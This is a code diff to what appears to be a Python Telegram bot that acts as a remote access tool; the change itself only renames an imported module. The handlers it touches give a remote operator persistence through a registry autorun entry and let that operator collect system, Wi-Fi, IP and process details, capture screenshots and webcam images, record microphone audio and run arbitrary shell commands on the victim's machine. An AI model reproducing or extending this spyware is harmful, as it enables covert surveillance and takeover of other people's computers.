@@ -1,6 +1,6 @@
 import os
 import asyncio
-import module
+import modules
 from aiogram import types
 from tg_config import admin_id
 from tg.dispatcher import dp
@@ -37,7 +37,7 @@ async def support(message: types.Message):
 
 @dp.message_handler(commands="reg_autorun")
 async def add_to_autorun(message: types.Message):
-    if module.RegEdit().create_autorun():
+    if modules.RegEdit().create_autorun():
         await message.answer("System append to registry")
     else:
         await message.answer("System don't append to registry")
@@ -45,7 +45,7 @@ async def add_to_autorun(message: types.Message):
 
 @dp.message_handler(commands="del_autorun")
 async def add_to_autorun(message: types.Message):
-    if module.RegEdit().delete_autorun():
+    if modules.RegEdit().delete_autorun():
         await message.answer("System del from registry")
     else:
         await message.answer("System don't del from registry")
@@ -58,31 +58,31 @@ async def system_check(message: types.Message):
 
 @dp.message_handler(commands="pc_info")
 async def send_pc_info(message: types.Message):
-    result = module.GetInfo().get_pc_info()
+    result = modules.GetInfo().get_pc_info()
     await message.answer(result)
 
 
 @dp.message_handler(commands="wifi_info")
 async def send_wifi_info(message: types.Message):
-    result = module.GetInfo().get_wifi_info()
+    result = modules.GetInfo().get_wifi_info()
     await message.answer(result)
 
 
 @dp.message_handler(commands="con_info")
 async def send_connection_info(message: types.Message):
-    result = module.GetInfo().get_connection_info()
+    result = modules.GetInfo().get_connection_info()
     await message.answer(result)
 
 
 @dp.message_handler(commands="pub_ip_info")
 async def send_connection_info(message: types.Message):
-    result = module.GetInfo().get_pub_ip_info()
+    result = modules.GetInfo().get_pub_ip_info()
     await message.answer(result)
 
 
 @dp.message_handler(commands="proc_info")
 async def send_process_info(message: types.Message):
-    result = module.GetInfo().get_process()
+    result = modules.GetInfo().get_process()
     if len(result) > 4096:
         for x in range(0, len(result), 4096):
             await message.answer(result[x:x + 4096])
@@ -92,14 +92,14 @@ async def send_process_info(message: types.Message):
 
 @dp.message_handler(commands="screen")
 async def send_screen(message: types.Message):
-    screen_path = module.View().make_screenshot()
+    screen_path = modules.View().make_screenshot()
     await message.answer_photo(open(screen_path, "rb"))
     os.remove(screen_path)
 
 
 @dp.message_handler(commands="webcam_screen")
 async def send_screen(message: types.Message):
-    webcam_screen_path = module.View().make_webcam_screen()
+    webcam_screen_path = modules.View().make_webcam_screen()
     await message.answer_photo(open(webcam_screen_path, "rb"))
     os.remove(webcam_screen_path)
 
@@ -108,9 +108,9 @@ async def send_screen(message: types.Message):
 async def send_audio(message: types.Message):
     if len(message.text.split(" ")) == 2:
         seconds_count = int(message.text.split(" ")[-1])
-        audio_path = module.AudioRecording().recording(seconds_count)
+        audio_path = modules.AudioRecording().recording(seconds_count)
     else:
-        audio_path = module.AudioRecording().recording()
+        audio_path = modules.AudioRecording().recording()
     await message.answer_audio(open(audio_path, "rb"))
     os.remove(audio_path)
 
@@ -120,7 +120,7 @@ async def cmd_exec(message: types.Message):
     if len(message.text.split(" ")) >= 2:
         command = " ".join(message.text.split(" ")[1:])
         if "cmd" not in command:
-            module.Shell.exec_command(command)
+            modules.Shell.exec_command(command)
         else:
             await message.answer("Invalid command")
     else:
